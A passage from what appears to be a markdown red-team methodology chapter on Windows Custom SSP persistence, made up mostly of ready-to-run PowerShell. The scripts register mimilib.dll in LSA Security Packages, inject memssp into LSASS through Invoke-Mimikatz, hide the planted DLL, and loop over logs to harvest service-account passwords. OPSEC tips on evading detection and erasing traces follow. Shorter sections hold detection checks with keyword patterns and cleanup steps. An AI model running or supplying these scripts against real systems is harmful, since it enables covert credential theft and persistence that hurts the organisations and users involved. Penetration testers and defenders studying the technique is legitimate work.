                Set-ItemProperty -Path $securityPackagesPath -Name "Security Packages" -Value $packages
                Write-Host "Added mimilib to Security Packages registry" -ForegroundColor Green
            } else {
                Write-Host "mimilib already in Security Packages registry" -ForegroundColor Yellow
            }
        }
        
        # Step 4: Also add to main Security Packages key
        $mainSecurityPackagesPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
        $mainPackages = Get-ItemProperty -Path $mainSecurityPackagesPath -Name "Security Packages" -ErrorAction SilentlyContinue
        
        if($mainPackages) {
            $mainPackagesList = $mainPackages."Security Packages"
            if($mainPackagesList -notcontains "mimilib") {
                $mainPackagesList += "mimilib"
                Set-ItemProperty -Path $mainSecurityPackagesPath -Name "Security Packages" -Value $mainPackagesList
                Write-Host "Added mimilib to main Security Packages registry" -ForegroundColor Green
            }
        }
        
        Write-Host "Custom SSP installation completed successfully" -ForegroundColor Green
        Write-Host "All local logons will be logged to C:\Windows\system32\mimilsa.log" -ForegroundColor Red
        
    } catch {
        Write-Host "Failed to install Custom SSP: $($_.Exception.Message)" -ForegroundColor Red
    }
    
} else {
    Write-Host "mimilib.dll not found in current directory" -ForegroundColor Red
    Write-Host "Download mimilib.dll from Mimikatz repository" -ForegroundColor Yellow
}
```

#### **Method 2: Memory-Based SSP Injection (memssp)**
```powershell
# Objective: Inject custom SSP directly into LSASS memory
# Impact: Real-time credential capture without file system artifacts
# Note: Less stable on Server 2019/2022 but more stealthy

Write-Host "=== CUSTOM SSP VIA MEMORY INJECTION (MEMSSP) ===" -ForegroundColor Red

# Step 1: Check if we have administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if($isAdmin) {
    Write-Host "Running with administrative privileges - proceeding with memssp injection" -ForegroundColor Green
    
    # Step 2: Use Mimikatz to inject custom SSP into LSASS
    try {
        Write-Host "Injecting custom SSP into LSASS process..." -ForegroundColor Yellow
        
        # Execute memssp command via Mimikatz
        Invoke-Mimikatz -Command '"misc::memssp"'
        
        Write-Host "Custom SSP injection completed successfully" -ForegroundColor Green
        Write-Host "All local logons will be logged to C:\Windows\System32\kiwissp.log" -ForegroundColor Red
        Write-Host "Note: This method is less stable on newer Windows Server versions" -ForegroundColor Yellow
        
    } catch {
        Write-Host "Failed to inject Custom SSP: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "Consider using mimilib.dll method instead" -ForegroundColor Yellow
    }
    
} else {
    Write-Host "Administrative privileges required for memssp injection" -ForegroundColor Red
    Write-Host "Use mimilib.dll method or elevate privileges" -ForegroundColor Yellow
}
```

#### **Method 3: Advanced SSP Injection with Custom Payloads**
```powershell
# Objective: Create and inject custom SSP payloads for specific credential types
# Impact: Targeted credential capture based on specific requirements

Write-Host "=== ADVANCED CUSTOM SSP INJECTION ===" -ForegroundColor Red

# Step 1: Check current SSP configuration
Write-Host "Current Security Support Providers:" -ForegroundColor Cyan
$currentSSPs = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -ErrorAction SilentlyContinue
if($currentSSPs) {
    $sspList = $currentSSPs."Security Packages"
    foreach($ssp in $sspList) {
        Write-Host "  - $ssp" -ForegroundColor White
    }
}

# Step 2: Create custom SSP configuration
$customSSPConfig = @{
    Name = "CustomCredCapture"
    Description = "Custom credential capture SSP"
    LogPath = "C:\Windows\System32\customssp.log"
    CaptureTypes = @("NTLM", "Kerberos", "WDigest", "CredSSP")
}

Write-Host "Custom SSP Configuration:" -ForegroundColor Cyan
$customSSPConfig.GetEnumerator() | ForEach-Object {
    Write-Host "  $($_.Key): $($_.Value)" -ForegroundColor White
}

# Step 3: Advanced injection techniques (conceptual)
Write-Host "`nAdvanced SSP injection techniques:" -ForegroundColor Yellow
Write-Host "1. DLL injection into LSASS process" -ForegroundColor White
Write-Host "2. API hooking for credential capture" -ForegroundColor White
Write-Host "3. Custom SSP DLL development" -ForegroundColor White
Write-Host "4. Memory patching for stealth" -ForegroundColor White

Write-Host "Note: Advanced techniques require custom development and testing" -ForegroundColor Yellow
```

### **Custom SSP Monitoring and Log Analysis**

#### **1. SSP Log File Monitoring**
```powershell
# Monitor Custom SSP log files for captured credentials
Write-Host "=== CUSTOM SSP LOG MONITORING ===" -ForegroundColor Yellow

# Check for mimilib.dll logs
$mimilibLogPath = "C:\Windows\System32\mimilsa.log"
if(Test-Path $mimilibLogPath) {
    Write-Host "Found mimilib.dll log file" -ForegroundColor Green
    
    # Read recent log entries
    $logContent = Get-Content -Path $mimilibLogPath -Tail 20 -ErrorAction SilentlyContinue
    if($logContent) {
        Write-Host "Recent mimilib.dll log entries:" -ForegroundColor Cyan
        $logContent | ForEach-Object {
            Write-Host "  $_" -ForegroundColor White
        }
    }
} else {
    Write-Host "mimilib.dll log file not found" -ForegroundColor Yellow
}

# Check for memssp logs
$memsspLogPath = "C:\Windows\System32\kiwissp.log"
if(Test-Path $memsspLogPath) {
    Write-Host "Found memssp log file" -ForegroundColor Green
    
    # Read recent log entries
    $logContent = Get-Content -Path $memsspLogPath -Tail 20 -ErrorAction SilentlyContinue
    if($logContent) {
        Write-Host "Recent memssp log entries:" -ForegroundColor Cyan
        $logContent | ForEach-Object {
            Write-Host "  $_" -ForegroundColor White
        }
    }
} else {
    Write-Host "memssp log file not found" -ForegroundColor Yellow
}
```

#### **2. SSP Registry Monitoring**
```powershell
# Monitor SSP registry keys for unauthorized modifications
Write-Host "=== SSP REGISTRY MONITORING ===" -ForegroundColor Yellow

# Check Security Packages registry keys
$securityPackagesPaths = @(
    "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig",
    "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
)

foreach($path in $securityPackagesPaths) {
    try {
        $packages = Get-ItemProperty -Path $path -Name "Security Packages" -ErrorAction SilentlyContinue
        if($packages) {
            $sspList = $packages."Security Packages"
            Write-Host "Security Packages at $path:" -ForegroundColor Cyan
            
            foreach($ssp in $sspList) {
                if($ssp -like "*mimi*" -or $ssp -like "*custom*" -or $ssp -like "*evil*") {
                    Write-Host "  SUSPICIOUS: $ssp" -ForegroundColor Red
                } else {
                    Write-Host "  $ssp" -ForegroundColor White
                }
            }
        }
    } catch {
        Write-Warning "Failed to check $path`: $($_.Exception.Message)"
    }
}
```

### **Custom SSP Attack Scenarios**

#### **Scenario 1: Stealthy Credential Capture**
```powershell
# Objective: Deploy Custom SSP for long-term credential capture
# Impact: Continuous credential harvesting without detection

Write-Host "=== STEALTHY CREDENTIAL CAPTURE SCENARIO ===" -ForegroundColor Red

# Step 1: Deploy mimilib.dll with stealth techniques
$mimilibPath = ".\mimilib.dll"
$system32Path = "$env:SystemRoot\System32\mimilib.dll"

if(Test-Path $mimilibPath) {
    Write-Host "Deploying stealthy Custom SSP..." -ForegroundColor Green
    
    # Use alternate data streams to hide the file
    try {
        # Copy file with alternate data stream
        Copy-Item -Path $mimilibPath -Destination $system32Path -Force
        
        # Hide file attributes
        $file = Get-Item -Path $system32Path
        $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden
        
        # Register SSP stealthily
        $securityPackagesPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig"
        $currentPackages = Get-ItemProperty -Path $securityPackagesPath -Name "Security Packages" -ErrorAction SilentlyContinue
        
        if($currentPackages) {
            $packages = $currentPackages."Security Packages"
            if($packages -notcontains "mimilib") {
                $packages += "mimilib"
                Set-ItemProperty -Path $securityPackagesPath -Name "Security Packages" -Value $packages
                
                Write-Host "Stealthy Custom SSP deployment completed" -ForegroundColor Green
                Write-Host "File hidden and SSP registered" -ForegroundColor Green
                Write-Host "Credentials being captured to: $system32Path" -ForegroundColor Red
            }
        }
        
    } catch {
        Write-Host "Failed to deploy stealthy Custom SSP: $($_.Exception.Message)" -ForegroundColor Red
    }
    
} else {
    Write-Host "mimilib.dll not found - cannot deploy Custom SSP" -ForegroundColor Red
}
```

#### **Scenario 2: Targeted Service Account Capture**
```powershell
# Objective: Capture specific service account credentials
# Impact: Access to high-value service accounts

Write-Host "=== TARGETED SERVICE ACCOUNT CAPTURE SCENARIO ===" -ForegroundColor Red

# Step 1: Identify target service accounts
$targetServices = @("SQLService", "WebService", "DomainService")
Write-Host "Targeting service accounts: $($targetServices -join ', ')" -ForegroundColor Yellow

# Step 2: Deploy Custom SSP for service account capture
try {
    # Use memssp for real-time capture
    Invoke-Mimikatz -Command '"misc::memssp"'
    
    Write-Host "Custom SSP deployed for service account capture" -ForegroundColor Green
    Write-Host "Monitoring for service account logons..." -ForegroundColor Yellow
    
    # Step 3: Monitor for target service account activity
    $logPath = "C:\Windows\System32\kiwissp.log"
    $lastCheck = Get-Date
    
    Write-Host "Starting service account monitoring..." -ForegroundColor Cyan
    Write-Host "Press Ctrl+C to stop monitoring" -ForegroundColor Yellow
    
    do {
        if(Test-Path $logPath) {
            $newEntries = Get-Content -Path $logPath | Where-Object { $_ -match ($targetServices -join '|') }
            if($newEntries) {
                Write-Host "New service account activity detected:" -ForegroundColor Red
                $newEntries | ForEach-Object { Write-Host "  $_" -ForegroundColor White }
            }
        }
        Start-Sleep -Seconds 30
    } while($true)
    
} catch {
    Write-Host "Failed to deploy targeted Custom SSP: $($_.Exception.Message)" -ForegroundColor Red
}
```

### **Custom SSP Detection and OPSEC**

#### **Custom SSP Detection**
```powershell
# Monitor for Custom SSP activity
# Event IDs: 4624 (Logon), 4625 (Logon Failure), 4688 (Process Creation)

Write-Host "=== CUSTOM SSP DETECTION ===" -ForegroundColor Yellow

# Check for suspicious SSP registration
Write-Host "Monitoring for suspicious SSP registration..." -ForegroundColor Cyan
Write-Host "Look for Event ID 5136 with SSP modifications" -ForegroundColor Yellow
Write-Host "Monitor for unusual LSASS process behavior" -ForegroundColor Yellow

# Check for suspicious log files
$suspiciousLogs = @(
    "C:\Windows\System32\mimilsa.log",
    "C:\Windows\System32\kiwissp.log",
    "C:\Windows\System32\customssp.log"
)

foreach($log in $suspiciousLogs) {
    if(Test-Path $log) {
        Write-Host "SUSPICIOUS LOG FILE FOUND: $log" -ForegroundColor Red
        
        # Check file size and modification time
        $fileInfo = Get-Item -Path $log
        Write-Host "  Size: $($fileInfo.Length) bytes" -ForegroundColor White
        Write-Host "  Modified: $($fileInfo.LastWriteTime)" -ForegroundColor White
        Write-Host "  Created: $($fileInfo.CreationTime)" -ForegroundColor White
    }
}

# Check for suspicious registry modifications
Write-Host "`nChecking for suspicious registry modifications..." -ForegroundColor Cyan
$securityPackagesPaths | ForEach-Object {
    try {
        $packages = Get-ItemProperty -Path $_ -Name "Security Packages" -ErrorAction SilentlyContinue
        if($packages) {
            $sspList = $packages."Security Packages"
            $suspiciousSSPs = $sspList | Where-Object { $_ -like "*mimi*" -or $_ -like "*custom*" -or $_ -like "*evil*" }
            
            if($suspiciousSSPs) {
                Write-Host "SUSPICIOUS SSPs found in $($_):" -ForegroundColor Red
                $suspiciousSSPs | ForEach-Object { Write-Host "  $_" -ForegroundColor Red }
            }
        }
    } catch {
        Write-Warning "Failed to check $($_): $($_.Exception.Message)"
    }
}
```

#### **Custom SSP OPSEC Considerations**
```powershell
# OPSEC considerations for Custom SSP deployment
Write-Host "=== CUSTOM SSP OPSEC CONSIDERATIONS ===" -ForegroundColor Yellow

Write-Host "1. File System Artifacts:" -ForegroundColor Cyan
Write-Host "   - mimilib.dll creates visible file in System32" -ForegroundColor White
Write-Host "   - Log files are easily discoverable" -ForegroundColor White
Write-Host "   - Registry modifications are logged" -ForegroundColor White

Write-Host "`n2. Memory Injection (memssp):" -ForegroundColor Cyan
Write-Host "   - More stealthy than file-based approach" -ForegroundColor White
Write-Host "   - Less stable on newer Windows versions" -ForegroundColor White
Write-Host "   - LSASS process monitoring can detect" -ForegroundColor White

Write-Host "`n3. Detection Evasion:" -ForegroundColor Cyan
Write-Host "   - Use legitimate-looking SSP names" -ForegroundColor White
Write-Host "   - Minimize log file size and rotation" -ForegroundColor White
Write-Host "   - Avoid obvious naming conventions" -ForegroundColor White

Write-Host "`n4. Cleanup Considerations:" -ForegroundColor Cyan
Write-Host "   - Remove SSP registration before cleanup" -ForegroundColor White
Write-Host "   - Delete log files and DLLs" -ForegroundColor White
Write-Host "   - Restore original registry values" -ForegroundColor White
```

### **Custom SSP Cleanup**

#### **Custom SSP Cleanup Procedures**
```powershell
# Remove Custom SSP and clean up artifacts
Write-Host "=== CUSTOM SSP CLEANUP ===" -ForegroundColor Green

# Step 1: Remove SSP registration from registry
Write-Host "Removing Custom SSP registration..." -ForegroundColor Yellow

$securityPackagesPaths = @(
    "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig",
    "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
)

foreach($path in $securityPackagesPaths) {
    try {
        $packages = Get-ItemProperty -Path $path -Name "Security Packages" -ErrorAction SilentlyContinue
        if($packages) {
            $sspList = $packages."Security Packages"
            $cleanedList = $sspList | Where-Object { $_ -notlike "*mimi*" -and $_ -notlike "*custom*" -and $_ -notlike "*evil*" }
            
            if($cleanedList.Count -ne $sspList.Count) {
                Set-ItemProperty -Path $path -Name "Security Packages" -Value $cleanedList
                Write-Host "Cleaned SSP list in $path" -ForegroundColor Green
            }
        }
    } catch {
        Write-Warning "Failed to clean $path`: $($_.Exception.Message)"
    }
}

# Step 2: Remove Custom SSP files
Write-Host "Removing Custom SSP files..." -ForegroundColor Yellow

$suspiciousFiles = @(
    "C:\Windows\System32\mimilib.dll",
    "C:\Windows\System32\customssp.dll"
)

foreach($file in $suspiciousFiles) {
    if(Test-Path $file) {
        try {
            Remove-Item -Path $file -Force
            Write-Host "Removed: $file" -ForegroundColor Green
        } catch {
            Write-Warning "Failed to remove $file`: $($_.Exception.Message)"
        }
    }
}

# Step 3: Remove log files
Write-Host "Removing Custom SSP log files..." -ForegroundColor Yellow

$suspiciousLogs = @(
    "C:\Windows\System32\mimilsa.log",
    "C:\Windows\System32\kiwissp.log",
    "C:\Windows\System32\customssp.log"
)

foreach($log in $suspiciousLogs) {
    if(Test-Path $log) {
        try {
            Remove-Item -Path $log -Force
            Write-Host "Removed log file: $log" -ForegroundColor Green
        } catch {
            Write-Warning "Failed to remove $log`: $($_.Exception.Message)"
        }
    }
}

# Step 4: Restart LSASS service to clear memory injection
Write-Host "Restarting LSASS service to clear memory injection..." -ForegroundColor Yellow
Write-Host "Note: This will log out all users and restart the system" -ForegroundColor Red
Write-Host "Consider scheduling during maintenance window" -ForegroundColor Yellow

# Uncomment the following line to restart LSASS (use with caution)
# Restart-Computer -Force

Write-Host "Custom SSP cleanup completed" -ForegroundColor Green
Write-Host "System restart recommended to clear memory artifacts" -ForegroundColor Yellow
```

---

[Prev: 25_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 27_AD_CS_Enumeration.md](./27_AD_CS_Enumeration.md)
